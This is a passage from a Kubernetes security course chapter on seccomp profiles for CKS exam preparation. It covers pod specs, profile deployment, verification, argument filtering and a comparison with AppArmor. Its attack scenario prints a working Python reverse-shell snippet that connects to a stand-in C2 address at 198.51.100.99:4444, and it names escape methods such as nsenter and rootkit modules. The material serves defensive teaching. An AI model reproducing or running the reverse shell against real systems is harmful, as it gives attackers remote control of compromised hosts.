}</code></pre>
                </div>
                <p><strong>This profile allows ~90 syscalls</strong> — the union of what Django, Gunicorn, Python, and the PostgreSQL driver need. The <code>defaultAction: SCMP_ACT_ERRNO</code> blocks everything else (~210+ syscalls). Note what's NOT on the allowed list: <code>mount</code>, <code>ptrace</code>, <code>unshare</code>, <code>setns</code>, <code>kexec_load</code>, <code>bpf</code>, <code>init_module</code> — every container escape and privilege escalation syscall is blocked by the default.</p>

                <h4>Real-World Seccomp Attack Examples — Why This Matters</h4>
                <div class="scenario-box">
                    <div class="scenario-header">
                        <span class="scenario-badge danger">REAL ATTACKS</span>
                        <span class="scenario-title">Three Attacks That Seccomp Would Have Blocked</span>
                    </div>
                    <div class="scenario-steps">
                        <div class="scenario-step"><div class="step-marker">1</div><div class="step-content"><strong>Dirty COW (CVE-2016-5195) — Privilege escalation via /proc/self/mem</strong><p>Attacker exploits a race condition to write to read-only memory mappings. Requires <code>ptrace</code> and <code>/proc/self/mem</code> access. <strong>Seccomp RuntimeDefault blocks <code>ptrace</code></strong> — the exploit fails at the kernel level before the race condition can be triggered.</p></div></div>
                        <div class="scenario-step"><div class="step-marker">2</div><div class="step-content"><strong>Container escape via nsenter (2021) — Namespace breakout</strong><p>Attacker uses <code>nsenter --target 1 --all</code> to join the host's namespaces, escaping the container entirely. Requires <code>setns</code> syscall. <strong>Seccomp RuntimeDefault blocks <code>setns</code></strong> — the attacker cannot escape to host namespaces.</p></div></div>
                        <div class="scenario-step"><div class="step-marker">3</div><div class="step-content"><strong>Kernel module rootkit (2022) — Persistent stealth malware</strong><p>Attacker compiles a malicious kernel module (<code>.ko</code> file) that hides processes and files. Requires <code>init_module</code> or <code>finit_module</code> syscall. <strong>Seccomp blocks both</strong> — the rootkit cannot be loaded. Without Seccomp, this attack gives the attacker permanent, invisible control of the entire node.</p></div></div>
                    </div>
                </div>
            </section>

            <!-- ═══════════ SECTION 15.3 ═══════════ -->
            <section class="section-block" id="s15-3">
                <h3 class="section-h">15.3 Applying Seccomp in Kubernetes Pod Specs</h3>
                <p>Once your custom Seccomp profile JSON is on every node at <code>/var/lib/kubelet/seccomp/</code> <em>(see §15.5 for the exact subdirectory the kubelet actually resolves against)</em>, you apply it to a pod via <code>securityContext.seccompProfile</code>. This is the native field (GA since K8s 1.19) — there is no annotation-based method for Seccomp unlike AppArmor.</p>

                <h4>Pod with RuntimeDefault Seccomp — The Minimum Baseline</h4>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">YAML — easypj Django pod with RuntimeDefault Seccomp</span>
                    </div>
                    <pre><code class="language-yaml">apiVersion: v1
kind: Pod
metadata:
  name: easypj-django
  namespace: easypj
spec:
  securityContext:
    seccompProfile:
      type: RuntimeDefault  # ← Every pod should have this
  containers:
  - name: easypj
    image: registry.easypj.com/easypj-django:v2.0.0
    securityContext:
      runAsNonRoot: true
      runAsUser: 1000
      allowPrivilegeEscalation: false
      capabilities:
        drop: [ALL]
      readOnlyRootFilesystem: true</code></pre>
                </div>

                <h4>Pod with Custom Localhost Seccomp Profile</h4>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">YAML — easypj Django pod with custom Seccomp profile</span>
                    </div>
                    <pre><code class="language-yaml">apiVersion: v1
kind: Pod
metadata:
  name: easypj-django
  namespace: easypj
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: easypj-django.json  # File at: /var/lib/kubelet/seccomp/
  containers:
  - name: easypj
    image: registry.easypj.com/easypj-django:v2.0.0</code></pre>
                </div>

                <h4>Deploying Custom Seccomp Profiles to All Nodes</h4>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">Bash — Copy Seccomp profile to all nodes in the cluster</span>
                    </div>
                    <pre><code class="language-bash">#!/bin/bash
# Deploy easypj-django.json seccomp profile to ALL worker nodes
PROFILE="easypj-django.json"
NODES=$(kubectl get nodes -o jsonpath='{.items[*].status.addresses[?(@.type=="InternalIP")].address}')

for NODE in $NODES; do
    echo "=== Deploying to $NODE ==="
    scp $PROFILE root@${NODE}:/var/lib/kubelet/seccomp/${PROFILE}
    ssh root@${NODE} "chmod 644 /var/lib/kubelet/seccomp/${PROFILE}"
    ssh root@${NODE} "ls -la /var/lib/kubelet/seccomp/${PROFILE}"
done

echo "✅ Profile deployed to all nodes"</code></pre>
                </div>
                <p style="text-align:center; margin-top:4px; color:#8b949e; font-size:0.82rem;">⚠️ This script (and the two YAML snippets above) show the simplified two-level path for readability. §15.5 documents the exact, official directory structure — including a <code>profiles/</code> subdirectory this script would need to target.</p>

                <h4>How containerd Applies Seccomp — The OCI Runtime Spec Integration</h4>
                <p>When Kubernetes creates a pod, the kubelet delegates container creation to the <strong>container runtime</strong> (containerd or CRI-O) via the CRI (Container Runtime Interface). The runtime then translates the pod spec into an <strong>OCI (Open Container Initiative) runtime spec</strong> — and this is where Seccomp is actually applied. Understanding this chain helps you debug when Seccomp profiles don't take effect:</p>
                <div class="diagram-container">
                    <div class="diagram-title">Kubernetes Pod Spec → OCI Runtime Spec → Kernel Seccomp</div>
<pre>
  KUBERNETES POD YAML:
  ─────────────────────
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: easypj-django.json
  │
  ▼
  KUBELET (on the node):
  ──────────────────────
  1. Reads the pod spec from the API server.
  2. Detects seccompProfile: type=Localhost, localhostProfile=easypj-django.json
  3. Resolves the profile path: /var/lib/kubelet/seccomp/easypj-django.json
  4. Reads the JSON file and stores it.
  5. Calls CRI: RunPodSandbox() → CreateContainer()
  6. In CreateContainer, passes the seccomp profile to containerd.
  │
  ▼
  CONTAINERD (CRI runtime):
  ─────────────────────────
  1. Receives the CreateContainerRequest with the seccomp profile.
  2. Translates into OCI runtime spec (config.json):
     ┌──────────────────────────────────────────────────────────────┐
     │  {                                                           │
     │    "linux": {                                                 │
     │      "seccomp": {                                             │
     │        "defaultAction": "SCMP_ACT_ERRNO",                      │
     │        "architectures": ["SCMP_ARCH_X86_64"],                 │
     │        "syscalls": [                                           │
     │          {"names": ["open", "read", "write", ...],           │
     │           "action": "SCMP_ACT_ALLOW"}                         │
     │        ]                                                       │
     │      }                                                         │
     │    }                                                           │
     │  }                                                             │
     └──────────────────────────────────────────────────────────────┘
  3. Passes this OCI spec to runc (the low-level OCI runtime).
  │
  ▼
  RUNC (OCI runtime):
  ───────────────────
  1. Reads the OCI spec's linux.seccomp section.
  2. Converts the JSON into a BPF program using libseccomp.
  3. Calls seccomp(SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_TSYNC, &bpf)
     BEFORE executing the container's entrypoint.
  4. The BPF program is NOW attached to the container's init process (PID 1).
  5. All child processes inherit the seccomp filter automatically
     (thanks to SECCOMP_FILTER_FLAG_TSYNC — thread synchronization).
  6. Runc then execve()s the container's entrypoint.
  │
  ▼
  CONTAINER PROCESS (PID 1):
  ──────────────────────────
  Every syscall made by this process (and all its children) goes through
  the BPF seccomp filter. The filter was installed BEFORE the entrypoint
  started — it was never unconfined, even for a microsecond.

  ⚡ THIS IS WHY THE PROFILE MUST BE ON THE NODE BEFORE THE POD STARTS:
  ────────────────────────────────────────────────────────────────────
  The kubelet resolves and reads the profile file during CreateContainer.
  If the file doesn't exist at CreateContainer time, the container
  creation FAILS with:
  "cannot load seccomp profile /var/lib/kubelet/seccomp/easypj-django.json:
   no such file or directory"
  The pod stays in ContainerCreating. There is no retry with a different
  profile — you must fix the file and recreate the pod.
</pre>
                </div>

                <h4>Syscall Argument Filtering — Going Beyond Just Syscall Names</h4>
                <p>Seccomp BPF can filter not just WHICH syscall is being made, but also <strong>the arguments</strong> to that syscall. This allows very fine-grained policies — for example, allowing <code>socket()</code> but ONLY for <code>AF_INET</code> (IPv4) and <code>SOCK_STREAM</code> (TCP), not <code>AF_PACKET</code> (raw sockets). This is how the Docker default profile blocks raw sockets while allowing normal TCP sockets:</p>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">JSON — Seccomp profile with argument filtering (block raw sockets, allow TCP)</span>
                    </div>
                    <pre><code class="language-json">{
  "defaultAction": "SCMP_ACT_ERRNO",
  "syscalls": [
    {
      "names": ["socket"],
      "action": "SCMP_ACT_ERRNO",
      "args": [
        {
          "index": 0,
          "value": 17,
          "valueTwo": 0,
          "op": "SCMP_CMP_EQ"
        }
      ],
      "comment": "Block AF_PACKET (raw sockets). Index 0 = first argument (domain). Value 17 = AF_PACKET."
    },
    {
      "names": ["socket"],
      "action": "SCMP_ACT_ALLOW",
      "args": [
        {
          "index": 0,
          "value": 2,
          "op": "SCMP_CMP_EQ"
        }
      ],
      "comment": "Allow AF_INET (IPv4). Value 2 = AF_INET. TCP and UDP sockets use this."
    }
  ]
}</code></pre>
                </div>
                <div class="card-grid cols-3">
                    <div class="info-card"><div class="card-icon-lg">0</div><h5>index</h5><p>Which argument to inspect (0 = first argument, 1 = second, etc.). Syscall arguments are in registers: rdi, rsi, rdx, r10, r8, r9.</p></div>
                    <div class="info-card"><div class="card-icon-lg">V</div><h5>value</h5><p>The value to compare against. For socket(), value 2 = AF_INET, value 10 = AF_INET6, value 17 = AF_PACKET.</p></div>
                    <div class="info-card"><div class="card-icon-lg">=</div><h5>op (operator)</h5><p>SCMP_CMP_EQ (equal), SCMP_CMP_NE (not equal), SCMP_CMP_LT (less than), SCMP_CMP_GT (greater than), SCMP_CMP_MASKED_EQ (bitmask match).</p></div>
                </div>

                <h4>Verifying Seccomp Is Active — Multiple Methods</h4>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">Bash — Verify Seccomp profile is applied and blocking</span>
                    </div>
                    <pre><code class="language-bash"># METHOD 1: Check pod's securityContext
kubectl get pod easypj-django -n easypj -o jsonpath='{.spec.securityContext.seccompProfile}'
# Output: {"localhostProfile":"easypj-django.json","type":"Localhost"}

# METHOD 2: Check process status INSIDE the container (most reliable)
kubectl exec -n easypj easypj-django -- cat /proc/1/status | grep Seccomp
# Output: Seccomp: 2  (2 = SECCOMP_MODE_FILTER — profile is active)
#          Seccomp: 0  (0 = SECCOMP_MODE_DISABLED — NO profile!)
#          Seccomp: 1  (1 = SECCOMP_MODE_STRICT — legacy mode, rare)

# METHOD 3: Check the seccomp flags
kubectl exec -n easypj easypj-django -- cat /proc/1/status | grep Seccomp_filters
# Shows BPF program count — should be 1 if seccomp is active

# METHOD 4: Test by attempting a BLOCKED syscall
# (mount is blocked by RuntimeDefault and most custom profiles)
kubectl exec -n easypj easypj-django -- mount
# Expected output: mount: permission denied (errno returned by Seccomp)
# If mount WORKS → Seccomp is NOT active → investigate immediately

# METHOD 5: Check from the NODE
NODE=$(kubectl get pod -n easypj easypj-django -o jsonpath='{.spec.nodeName}')
ssh $NODE "cat /proc/\$(pgrep -f gunicorn | head -1)/status | grep Seccomp"
# Should show: Seccomp: 2</code></pre>
                </div>

                <div class="info-box tip">
                    <h5>💡 Key Takeaway for the CKS Exam</h5>
                    <p>Seccomp tasks on the CKS exam follow a <strong>four-step workflow</strong>: (1) Write the JSON profile (or use the one provided by the exam), (2) Copy it to <code>/var/lib/kubelet/seccomp/</code> on the node (SSH to the node as root), (3) Apply it in the pod spec with <code>seccompProfile: type: Localhost, localhostProfile: &lt;name&gt;</code>, (4) Verify with <code>kubectl exec -- cat /proc/1/status | grep Seccomp</code> — it must return <code>Seccomp: 2</code>. <strong>Never forget step 2:</strong> if the JSON file isn't on the node before the pod starts, the pod will fail to create. The CKS exam WILL test that you know the correct directory — the exact one, <code>profiles/</code> subdirectory and all, is in §15.5. And remember: every pod should have <strong>at least RuntimeDefault</strong>. The exam may deduct points if you leave a pod unconfined when the question didn't explicitly ask you to configure Seccomp — it's expected as a baseline security practice.</p>
                </div>
            </section>

            <!-- ═══════════ SECTION 15.4 ═══════════ -->
            <section class="section-block" id="s15-4">
                <h3 class="section-h">15.4 AppArmor vs Seccomp — Know the Difference (CKS Exam Critical)</h3>
                <p>AppArmor and Seccomp are complementary but fundamentally different. AppArmor controls <strong>WHAT</strong> a process can access (files, network, capabilities). Seccomp controls <strong>HOW</strong> a process talks to the kernel (which syscalls). You need BOTH for defense-in-depth. A process that passes AppArmor checks can still be blocked by Seccomp — and vice versa. Here is the definitive comparison:</p>

                <div class="comparison-table">
                    <table>
                        <thead><tr><th>Feature</th><th>AppArmor (Ch14)</th><th>Seccomp (Ch15)</th></tr></thead>
                        <tbody>
                            <tr><td><strong>Controls</strong></td><td>File paths, network protocols, Linux capabilities, mount operations, signals, ptrace</td><td>Linux system calls (syscalls) — the raw kernel interface</td></tr>
                            <tr><td><strong>Level</strong></td><td>Application behavior — "Can this process read /etc/shadow?"</td><td>Kernel interface — "Can this process call mount()?"</td></tr>
                            <tr><td><strong>Profile format</strong></td><td>AppArmor-specific text syntax in <code>/etc/apparmor.d/</code></td><td>JSON file in <code>/var/lib/kubelet/seccomp/</code></td></tr>
                            <tr><td><strong>Distribution</strong></td><td>Ubuntu/Debian native (also SUSE). Not on RHEL.</td><td>ALL Linux distributions (kernel feature since 2.6.12)</td></tr>
                            <tr><td><strong>Learning mode</strong></td><td>Yes — Complain mode logs without blocking</td><td>Limited — SCMP_ACT_LOG logs without blocking</td></tr>
                            <tr><td><strong>Runtime overhead</strong></td><td>Low — path-based DFA matching</td><td>Very low — BPF program runs in kernel, extremely fast</td></tr>
                            <tr><td><strong>Granularity</strong></td><td>Per-file, per-directory, per-capability</td><td>Per-syscall (plus syscall arguments with BPF)</td></tr>
                            <tr><td><strong>K8s Application</strong></td><td>Pod annotation OR securityContext.appArmorProfile</td><td>securityContext.seccompProfile (native field only)</td></tr>
                            <tr><td><strong>CKS Exam</strong></td><td>Hands-on: load profile on node, add annotation, switch modes</td><td>Hands-on: set RuntimeDefault, deploy custom JSON, verify with /proc</td></tr>
                        </tbody>
                    </table>
                </div>

                <h4>The Defense-in-Depth Order — AppArmor Runs BEFORE Seccomp</h4>
                <div class="diagram-container">
                    <div class="diagram-title">Attack Path Through Security Layers — Every Check Must Pass</div>
<pre>
  ATTACKER'S SYSCALL: open("/etc/shadow", O_RDONLY)
  │
  ▼
  ┌──────────────────────────────────────────────────────────────────────────┐
  │  1. DAC (Unix Permissions) — chmod/chown                                  │
  │     /etc/shadow is mode 000, root:shadow.                                  │
  │     If process is root → PASSES.                                           │
  ├──────────────────────────────────────────────────────────────────────────┤
  │  2. CAPABILITIES CHECK                                                    │
  │     Does the process have CAP_DAC_OVERRIDE? (root typically does)         │
  │     If yes → PASSES (can bypass DAC).                                     │
  │     ⚡ Ch18: drop ALL capabilities → even root can't bypass DAC.           │
  ├──────────────────────────────────────────────────────────────────────────┤
  │  3. APPARMOR (Ch14)                                                       │
  │     Profile check: "deny /etc/shadow r," → DENIED.                       │
  │     Returns -EACCES. Syscall ABORTED here.                               │
  │     ⚡ AppArmor runs FIRST (it's an LSM hook).                            │
  ├──────────────────────────────────────────────────────────────────────────┤
  │  4. SECCOMP (Ch15)                                                        │
  │     Even IF AppArmor allowed it, Seccomp checks:                         │
  │     "Is 'open' in the allowed syscall list?"                              │
  │     Usually YES — open is a normal syscall.                               │
  │     But if the profile blocks open for some paths → DENIED.              │
  │     ⚡ Seccomp runs AFTER AppArmor. It's the LAST gate before the kernel. │
  └──────────────────────────────────────────────────────────────────────────┘

  KEY INSIGHT: AppArmor blocks "open /etc/shadow" because the PATH is denied.
  Seccomp would block "mount" because the SYSCALL is denied.
  Both gates serve different purposes. Both must pass for the operation
  to succeed. Defense-in-depth means BOTH are configured.
</pre>
                </div>

                <h4>Combined Attack Scenario — How AppArmor + Seccomp Stop the Same Breach at Different Stages</h4>
                <p>Let's trace a single attack — a reverse shell from a compromised Django container — through BOTH AppArmor and Seccomp. This demonstrates why you need both controls and how they complement each other:</p>
                <div class="scenario-box">
                    <h5>🔴 ATTACK SCENARIO: Attacker Exploits Django RCE → Attempts Reverse Shell</h5>
                    <p><strong>The setup:</strong> An attacker has exploited a remote code execution vulnerability in the easypj Django application. They can run arbitrary Python code inside the container. Their goal: establish a reverse shell to their command-and-control server at 198.51.100.99:4444.</p>
                    <p><strong>The attacker's Python reverse shell code:</strong></p>
                    <pre><code class="language-python">import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("198.51.100.99", 4444))
os.dup2(s.fileno(), 0)  # Redirect stdin
os.dup2(s.fileno(), 1)  # Redirect stdout
os.dup2(s.fileno(), 2)  # Redirect stderr
subprocess.call(["/bin/sh", "-i"])  # Spawn interactive shell</code></pre>
                    <p><strong>What happens with AppArmor ONLY (no Seccomp):</strong></p>
                    <ol>
                        <li><code>socket(AF_INET, SOCK_STREAM)</code> → AppArmor allows TCP sockets (rule: <code>network tcp,</code>) → ✅ ALLOWED</li>
                        <li><code>connect(198.51.100.99, 4444)</code> → NetworkPolicy (Ch6) might block egress to external IPs. But AppArmor only controls protocol, not destination IP → ✅ ALLOWED by AppArmor</li>
                        <li><code>execve("/bin/sh")</code> → AppArmor profile has <code>/usr/bin/python3.* ix,</code> but does NOT allow executing <code>/bin/sh</code> → ❌ DENIED by AppArmor</li>
                        <li><strong>Result:</strong> The attack FAILS at step 3. AppArmor blocked the shell execution because /bin/sh is not in the allowed execution paths. But the socket connection succeeded — the attacker's C2 server received a TCP connection that immediately died. The attacker knows the container is there but can't get a shell.</li>
                    </ol>
                    <p><strong>What happens with Seccomp ONLY (no AppArmor):</strong></p>
                    <ol>
                        <li><code>socket(AF_INET, SOCK_STREAM)</code> → socket() is in the allowed list → ✅ ALLOWED</li>
                        <li><code>connect()</code> → connect() is in the allowed list → ✅ ALLOWED</li>
                        <li><code>dup2()</code> → dup2() is in the allowed list (needed for normal I/O) → ✅ ALLOWED</li>
                        <li><code>execve()</code> → execve() IS in the allowed list (needed to run Python) → ✅ ALLOWED</li>
                        <li><code>/bin/sh</code> runs. Attacker has a shell. But can they escape the container?</li>
                        <li><code>unshare(CLONE_NEWNS)</code> → ❌ BLOCKED by RuntimeDefault (escape vector)</li>
                        <li><code>mount("tmpfs", "/tmp/escape")</code> → ❌ BLOCKED by RuntimeDefault</li>
                        <li><strong>Result:</strong> The attacker got a shell (Seccomp didn't block execve) but CANNOT escape the container (Seccomp blocked unshare and mount). They're trapped — with a shell, but unable to break out.</li>
                    </ol>
                    <p><strong>What happens with BOTH AppArmor AND Seccomp:</strong></p>
                    <ol>
                        <li>The reverse shell FAILS at AppArmor (can't exec /bin/sh).</li>
                        <li>Even if the attacker used a Python-based shell (no execve of /bin/sh), AppArmor blocks reading /etc/shadow, /proc, /sys.</li>
                        <li>Even if they bypass AppArmor via a path alias, Seccomp blocks unshare, mount, ptrace — all escape vectors.</li>
                        <li>Even if they bypass BOTH, they're still running as UID 1000 (SecurityContext), with no capabilities (drop ALL), on a read-only root filesystem.</li>
                        <li><strong>The attacker has a shell but ZERO ability to do anything useful with it.</strong></li>
                    </ol>
                    <p><strong>The lesson:</strong> Each layer catches what the layer below might miss. AppArmor blocks by PATH (what file are you executing?). Seccomp blocks by SYSCALL (what kernel operation are you requesting?). SecurityContext blocks by IDENTITY (are you root? do you have capabilities?). Together, they create a defense-in-depth mesh where an attacker needs to find a bypass for ALL THREE simultaneously — which is exponentially harder than bypassing any one alone.</p>
                </div>
            </section>

            <!-- ═══════════ SECTION 15.5 ═══════════ -->
            <section class="section-block" id="s15-5">
                <h3 class="section-h">15.5 Official Seccomp Facts — Exact Paths, Exact JSON, One Hard Constraint</h3>
                <p>Everything in §15.2-15.4 above is accurate as a teaching model — but two of the details were <strong>simplified for readability</strong>, and one hard rule was never stated at all. This section is sourced directly from <code>kubernetes.io/docs/tutorials/security/seccomp</code> — two precision corrections to what you just read, plus a hard constraint the CKS exam loves to test.</p>

                <h4>Correction 1 — The Real On-Disk Path Has a <code>profiles/</code> Subdirectory</h4>
                <p>Every code block in §15.2 and §15.3 referenced <code>/var/lib/kubelet/seccomp/</code> as if it were the final resting place for a profile file. That directory is real — it's the kubelet's <strong>seccomp root directory</strong> — but <code>localhostProfile</code> paths in the pod spec are actually resolved <strong>relative to a <code>profiles/</code> subdirectory beneath it</strong>. A pod spec that says <code>localhostProfile: easypj-audit.json</code> does not resolve to <code>/var/lib/kubelet/seccomp/easypj-audit.json</code> — it resolves one level deeper.</p>
                <div class="diagram-container">
                    <div class="diagram-title">Path Resolution — What the Pod Spec Says vs Where the Kubelet Actually Looks</div>
<pre>
  POD SPEC SAYS:                              KUBELET ACTUALLY RESOLVES TO:
  ────────────────                            ──────────────────────────────
  localhostProfile: easypj-audit.json    →    /var/lib/kubelet/seccomp/profiles/easypj-audit.json
                                                                          ^^^^^^^^^
                                                                    the subdirectory
                                                                    §15.2-15.3 omitted

  ⚠️ A file placed directly in .../seccomp/ (no profiles/) will NOT be found.
     Always create the profiles/ subdirectory yourself before copying the JSON in.
</pre>
                </div>
                <div class="info-box warning">
                    <h5>⚠️ Path Correction — Always Create <code>profiles/</code> First</h5>
                    <p>The kubelet's seccomp root is <code>/var/lib/kubelet/seccomp/</code>, but every <code>localhostProfile</code> value is relative to a <code>profiles/</code> subdirectory beneath it. Before you <code>scp</code> or write any custom profile to a node, run <code>mkdir -p /var/lib/kubelet/seccomp/profiles</code> first. A profile dropped straight into <code>/var/lib/kubelet/seccomp/</code> without that subdirectory is invisible to the kubelet — the pod fails with the exact same "cannot load seccomp profile" error as a missing file, which makes this an easy trap to misdiagnose under exam time pressure.</p>
                </div>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">Corrected on-disk location and pod spec — copy exactly</span>
                    </div>
                    <pre><code class="language-bash"># ON-DISK LOCATION (note the profiles/ subdirectory)
/var/lib/kubelet/seccomp/profiles/easypj-audit.json</code></pre>
                    <pre><code class="language-yaml"># POD SPEC (localhostProfile is relative to profiles/)
securityContext:
  seccompProfile:
    type: Localhost
    localhostProfile: easypj-audit.json  # ← NOT the full path</code></pre>
                </div>

                <h4>Correction 2 — Raw Profile JSON Needs the Full <code>SCMP_ACT_</code> Prefix</h4>
                <p>The card grid in §15.2 labeled the four possible <code>syscalls[].action</code> values as "ALLOW, ERRNO, KILL, LOG, or TRAP" for brevity — that's the correct <em>concept</em>, but it is not valid JSON. The actual profile file on disk requires the <strong>full libseccomp action name</strong>: <code>"SCMP_ACT_ALLOW"</code>, <code>"SCMP_ACT_ERRNO"</code>, <code>"SCMP_ACT_LOG"</code>, and so on. Every code example elsewhere in this chapter already uses the full form correctly — this correction just makes explicit why that prefix is non-negotiable: a container runtime that receives <code>"action": "ALLOW"</code> instead of <code>"action": "SCMP_ACT_ALLOW"</code> will reject the entire profile as invalid, and the pod fails to start.</p>
                <div class="split-panel">
                    <div class="split-side split-bad">
                        <h5>❌ Short form — illustrates the concept only</h5>
                        <p><code>"action": "ALLOW"</code></p>
                        <p>Never valid in a real profile file. The runtime cannot parse it.</p>
                    </div>
                    <div class="split-side split-good">
                        <h5>✅ Full form — the only valid JSON</h5>
                        <p><code>"action": "SCMP_ACT_ALLOW"</code></p>
                        <p>Required prefix on every action value: <code>SCMP_ACT_ALLOW</code>, <code>SCMP_ACT_ERRNO</code>, <code>SCMP_ACT_KILL</code>, <code>SCMP_ACT_LOG</code>, <code>SCMP_ACT_TRAP</code>.</p>
                    </div>
                </div>
                <div class="code-block-wrapper">
                    <div class="code-block-header">
                        <span class="code-lang">JSON — Valid seccomp profile (full SCMP_ACT_ prefix required)</span>
                    </div>
                    <pre><code class="language-json">{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {"names": ["read","write","close","exit_group"],
     "action": "SCMP_ACT_ALLOW"}
  ]
}</code></pre>
                </div>

                <h4>Hard Constraint — <code>privileged: true</code> and Seccomp Are Mutually Exclusive</h4>
                <p>This one is not a simplification anywhere above — it's a rule this chapter hasn't stated yet. A container with <code>privileged: true</code> in its securityContext <strong>cannot use a seccomp profile at all</strong>. It always runs <strong>Unconfined</strong>, no matter what <code>seccompProfile.type</code> says in the pod spec. Setting <code>type: RuntimeDefault</code> or <code>type: Localhost</code> on a privileged container is silently ignored — the field is accepted by the API server, but the kernel never attaches a filter.</p>
                <div class="info-box danger">
                    <h5>⚠️ Hard Constraint — Privileged Containers Are ALWAYS Unconfined</h5>
                    <p>This is exactly why <code>privileged: true</code> and "seccomp/AppArmor sandboxing" are <strong>mutually exclusive</strong> on the exam: if a question asks you to satisfy BOTH privileged access AND syscall filtering on the same container, that's a trick question — you cannot have both simultaneously. The real fix is almost always to <strong>avoid <code>privileged: true</code> entirely</strong> and grant only the specific Linux capabilities the workload actually needs instead (Ch 18). If a task genuinely requires privileged mode (rare — CNI plugins, some storage drivers), document that Seccomp and AppArmor provide zero protection for that container and compensate with tighter NetworkPolicy, RBAC, and Falco runtime detection around it.</p>
                </div>

                <h4>Debugging Workflow — Straight From the Official Docs</h4>
                <p>When you don't yet know what a custom profile needs to allow, kubernetes.io's own tutorial recommends a two-phase rollout — the same LOG-then-ERRNO pattern hinted at in §15.1's <code>strace</code> walkthrough, stated here as the official procedure:</p>
                <div class="process-steps">
                    <div class="ps-step"><span class="ps-num">1</span><strong>Audit mode first:</strong> Set <code>defaultAction: SCMP_ACT_LOG</code>. Every syscall is logged, nothing is blocked. Run the app through its full workload.</div>
                    <div class="ps-step"><span class="ps-num">2</span><strong>Collect the syscall list:</strong> Read the audit log to see exactly which syscalls the app made — this is your evidence-based ALLOW list, not a guess.</div>
                    <div class="ps-step"><span class="ps-num">3</span><strong>Switch to enforcing mode:</strong> Change <code>defaultAction</code> to <code>SCMP_ACT_ERRNO</code> and add an explicit <code>SCMP_ACT_ALLOW</code> entry listing exactly the syscalls you observed in step 2.</div>
                    <div class="ps-step"><span class="ps-num">4</span><strong>Redeploy and verify:</strong> Roll the profile out, then confirm with <code>/proc/&lt;pid&gt;/status</code> that <code>Seccomp: 2</code> and that the app still functions under the tightened profile.</div>
                </div>
                <p style="text-align:center; margin-top:10px; color:#8b949e; font-size:0.82rem;">Skipping straight to <code>SCMP_ACT_ERRNO</code> without an audit pass is how "hardened" profiles break production apps — the LOG phase is what makes the ERRNO phase safe.</p>
            </section>

